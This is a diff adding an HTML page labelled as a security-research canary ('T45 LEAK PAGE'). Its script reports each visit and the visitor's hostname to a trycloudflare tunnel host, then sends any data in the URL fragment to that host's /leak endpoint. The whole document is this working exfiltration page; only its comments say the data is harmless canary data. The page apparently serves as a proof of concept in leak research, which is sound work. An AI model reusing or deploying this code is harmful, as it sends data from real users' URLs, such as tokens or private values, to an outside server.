@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>T45</title></head>
+<body style="font-family:Menlo,monospace;background:#111;color:#ccc;padding:20px">
+<h2 style="color:#f33">T45 LEAK PAGE (Pluto Security research canary)</h2>
+<pre id="out" style="color:#0f0">starting...</pre>
+<script>
+// T45 research canary: reads canary data from location.hash and sends it to the
+// researcher's own receiver. No real data involved. Nothing stored server-side
+// beyond a single log line.
+var T = "https://same-disc-constructed-brussels.trycloudflare.com";
+var out = document.getElementById("out");
+function log(m) { out.textContent += "\n" + m; }
+log("loaded from: " + location.href.slice(0, 80));
+fetch(T + "/leak-page-visited?from=" + encodeURIComponent(location.hostname)).catch(function (e) { log("visit-report failed: " + e); });
+var d = location.hash.length > 1 ? location.hash.slice(1) : null;
+if (d) {
+  log("hash data present (" + d.length + " chars) - sending to receiver...");
+  fetch(T + "/leak?d=" + encodeURIComponent(decodeURIComponent(d))).then(
+    function (r) { log("SENT: receiver responded status " + r.status + " - CANARY DATA EXFILTRATED END-TO-END (nothing real, nothing stored)"); },
+    function (e) { log("send failed: " + e); }
+  );
+} else {
+  log("no hash data - page reached without data");
+}
+</script>
+</body>
+</html>
